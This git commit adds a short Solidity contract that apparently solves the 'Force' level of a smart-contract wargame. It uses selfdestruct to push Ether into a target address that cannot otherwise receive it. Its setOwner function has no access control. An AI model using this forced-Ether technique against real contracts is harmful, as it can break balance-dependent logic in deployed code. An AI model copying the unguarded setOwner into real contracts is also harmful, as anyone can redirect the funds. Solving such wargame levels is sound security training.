e28a1a217f0f81912e86be226fbb80f24671ff08
Asamartino <a.samartino@protonmail.com>
2020-03-10 16:28:45 +0100

    Create Level7_Force.sol

---
+++ Level7_Force.sol
@@ -0,0 +1,21 @@
+pragma solidity ^0.6.3;
+
+
+contract ShutUpAndTakeMyMoney{
+    address payable owner;
+    
+    function setOwner(address payable _owner) public{
+        owner = _owner;
+    }
+     
+    function destroy() public{  //this conctract need to have a positive balance -> can do that by inputing a value in remix at deployement 
+        selfdestruct(owner);
+    }
+   constructor() public payable{ // used so we can use the Value filed of RemixIDE and send Ether at creation of the contract
+   }
+  
+    function giveMeMoney() public payable{ //to send money if you didn't send it at initiation
+    
+    }
+
+}
